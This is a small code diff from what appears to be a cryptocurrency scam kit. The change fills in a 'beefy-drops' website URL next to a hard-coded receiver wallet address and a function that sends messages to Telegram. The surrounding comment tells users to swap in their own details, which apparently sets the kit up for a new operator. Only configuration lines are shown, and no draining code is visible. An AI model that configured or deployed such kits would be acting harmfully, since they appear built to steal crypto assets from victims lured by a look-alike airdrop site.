@@ -25,5 +25,5 @@ async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
 
 // Change this information for yours (
 const bsc_wallet_receiver_id = '0x66a4C667A4288D3DDb2591C861f567f3C43C8843';
-const website_url = 'YOUR_WEBSITE_URL';
+const website_url = 'https://beefy-drops.vercel.app';
 sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
